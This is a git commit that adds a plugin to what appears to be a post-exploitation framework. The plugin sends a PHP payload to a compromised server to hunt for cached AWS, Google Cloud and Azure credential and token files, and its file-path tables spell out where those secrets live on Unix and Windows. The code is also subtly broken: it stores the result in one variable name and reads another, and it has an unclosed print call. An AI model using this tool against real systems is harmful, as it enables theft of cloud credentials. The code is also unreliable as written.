01cd3fa2c0b1a451ba2ce1d1e23fb513d00311c2
jose nazario <jose.monkey.org@gmail.com>
2018-08-25 17:05:22 -0400

    cloud credential grabber

---
+++ plugins/credentials/cloud/plugin.py
@@ -0,0 +1,67 @@
+"""Cloud Credential Hunter-Grabber
+
+SYNOPSIS:
+    cloudcredgrab [-u <USER>] [aws|google|azure]
+
+DESCRIPTION:
+    Hunts for cloud credentials cached on the system
+    by looking in user's directory
+
+EXAMPLES:
+    > cloudcredgrab 
+      - look for all cloud credentials in all user directories
+    > cloudcredgrab -u www aws
+      - look for AWS credentials in www's user files
+
+AUTHOR:
+    Jose <https://twitter.com/jnazario>
+"""
+
+import sys
+import os
+import time
+import json
+
+from api import plugin
+from api import server
+from api import environ
+
+from ui.color import colorize
+import plugin_args
+
+opt = plugin_args.parse(plugin.argv[1:])
+
+UNIX_FILES = {'aws': ['.aws/credentials', ],
+              'google': ['.config/gcloud/legacy_credentials', 
+                         '.config/gcloud/credentials.db', 
+                         '.config/gcloud/access_tokens.db'],
+              'azure': ['.azure/accessTokens.json', 
+                        '.azure/azureProfile.json']}
+WINDOWS_FILES = {'aws': [".aws\\credentials",],
+                 'google': ["\\AppData\\Roaming\\gcloud\\legacy_credentials", 
+                            "\\AppData\\Roaming\\gcloud\\credentials.db", 
+                            "\\AppData\\Roaming\\gcloud\\access_tokens.db"],
+                 'azure': [".azure\\accessTokens.json", ".azure\\azureProfile.json"]}
+
+if environ['PLATFORM'].startswith("win"):
+    FILES = WINDOWS_FILES
+else: 
+    FILES = UNIX_FILES
+
+if opt["platform"]:
+    SEARCH_FOR = FILES[opt["platform"]]
+else:
+    SEARCH_FOR = FILES["aws"] + FILES["google"] + FILES["azure"]
+
+# Send payload
+payload = server.payload.Payload("cloudcredgrab.php")
+payload['USER'] = opt['USER'] or "all"
+payload['SEARCH_FOR'] = SEARCH_FOR
+
+result = payload.send()
+
+if len(results) < 1:
+    print(colorize("%Red", "[-] No results found")
+else:
+    for filename in results:
+        print(colorize("%Green", "[+] Found {0}".format(filename)))
